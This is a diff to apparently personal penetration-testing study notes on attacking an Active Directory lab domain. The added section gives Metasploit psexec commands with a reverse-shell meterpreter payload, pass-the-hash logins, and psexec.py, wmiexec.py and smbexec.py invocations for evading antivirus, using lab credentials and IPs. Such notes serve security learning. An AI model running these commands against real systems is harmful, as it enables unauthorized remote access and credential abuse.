@@ -86,3 +86,37 @@ ntlmrelayx -tf targets.txt -smb2support -c "whoami"
 - Disable NTLM authentication on network : default back to NTLM if Kerberos stops working
 - Account tiering
 - Local admin restriction : limit attack surface with local admin abuse but can increase the amount of desk ticket if no admin rights is available for the user
+
+## Gaining Shelle Access
+
+Can get a shell using msfconsole using exploit psexec
+Using metasploit is noisy (exploit/windows/smb/psexec). But we can use psexec.py tool
+Use 4
+set payload windows/x64/meterpreter/reverse_tcp //change payload to discard 32 bits and take 64 bits
+options
+set RHOSTS 192.168.138.137
+set smbdomain MARVEL.local
+set smbuser fcastle
+set smbpass Password1
+
+show targets // list different targets, can be changed
+run
+background //run in background to come back later
+sessions // list all backgrounds
+sessions 1 //go back to session 1
+
+Now we want to realise a hash attack
+options
+Instead of a domaine we will set the smduser as administrator
+set smbuser adminsitrator
+unset smbdomain
+set smbpass HASH // Hash is the LM and NT hash LM_hash:NT_hash
+run
+
+We can also do this manually without metasploit
+psexec.py MARVEL/fcastle:'Password1'@192.168.138.137 // DOMAIN/user:'password'@IP_address
+
+Using a hash :
+psexec.y adminsitrator@192.168.138.137 -hashes LM_hash:NT_hash
+
+If psexec is not working or blocket by antivirus we can try wmiexec.py or smbexec.py using the same parameters
